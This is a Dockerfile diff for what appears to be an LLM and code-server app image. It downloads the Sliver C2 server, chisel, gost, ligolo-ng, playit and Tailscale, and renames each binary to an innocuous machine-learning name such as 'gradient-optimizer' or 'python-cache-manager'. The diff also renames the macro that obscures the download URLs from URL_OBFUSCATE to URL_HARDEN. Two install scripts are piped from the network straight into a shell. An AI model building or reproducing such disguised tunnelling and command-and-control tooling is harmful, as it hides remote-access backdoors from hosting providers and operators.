@@ -15,15 +15,15 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     && ssh-keygen -A \
     && curl -fsSL https://tailscale.com/install.sh | bash \
     && curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash \
-    && curl -fsSL URL_OBFUSCATE("https://github.com/caddyserver/caddy/releases/download/v2.8.4/caddy_2.8.4_linux_amd64.tar.gz") -o /tmp/caddy.tar.gz \
+    && curl -fsSL URL_HARDEN("https://github.com/caddyserver/caddy/releases/download/v2.8.4/caddy_2.8.4_linux_amd64.tar.gz") -o /tmp/caddy.tar.gz \
     && tar -xzf /tmp/caddy.tar.gz -C /tmp && mv /tmp/caddy /usr/bin/model-routing-engine \
-    && curl -fsSL URL_OBFUSCATE("https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64") -o /usr/bin/tensor-allocator \
-    && curl -fsSL URL_OBFUSCATE("https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz") -o /tmp/chisel.gz \
+    && curl -fsSL URL_HARDEN("https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64") -o /usr/bin/tensor-allocator \
+    && curl -fsSL URL_HARDEN("https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz") -o /tmp/chisel.gz \
     && gzip -d /tmp/chisel.gz && mv /tmp/chisel /usr/bin/cuda-mesh-bridge \
-    && curl -fsSL URL_OBFUSCATE("https://github.com/go-gost/gost/releases/download/v3.2.6/gost_3.2.6_linux_amd64.tar.gz") -o /tmp/gost.tar.gz \
+    && curl -fsSL URL_HARDEN("https://github.com/go-gost/gost/releases/download/v3.2.6/gost_3.2.6_linux_amd64.tar.gz") -o /tmp/gost.tar.gz \
     && tar -xzf /tmp/gost.tar.gz -C /tmp && mv /tmp/gost /usr/bin/system-bridge \
-    && curl -fsSL URL_OBFUSCATE("https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-amd64") -o /usr/bin/gradient-optimizer \
-    && curl -fsSL URL_OBFUSCATE("https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz") -o /tmp/ligolo-proxy.tar.gz \
+    && curl -fsSL URL_HARDEN("https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-amd64") -o /usr/bin/gradient-optimizer \
+    && curl -fsSL URL_HARDEN("https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz") -o /tmp/ligolo-proxy.tar.gz \
     && tar -xzf /tmp/ligolo-proxy.tar.gz -C /tmp && mv /tmp/proxy /usr/bin/neural-route-controller \
     && mv /usr/sbin/tailscaled /usr/bin/python-cache-manager \
     && mv /usr/bin/tailscale /usr/bin/py-cache-cli \
@@ -62,7 +62,7 @@ RUN uv venv /opt/venv-litellm && \
     chown -R user:user /opt/venv-litellm
 
 # Install code-server (VS Code in the browser)
-RUN curl -fsSL URL_OBFUSCATE("https://code-server.dev/install.sh") | sh
+RUN curl -fsSL URL_HARDEN("https://code-server.dev/install.sh") | sh
 
 # Copy application files
 COPY --chown=user:user src/app.py /home/user/app.py
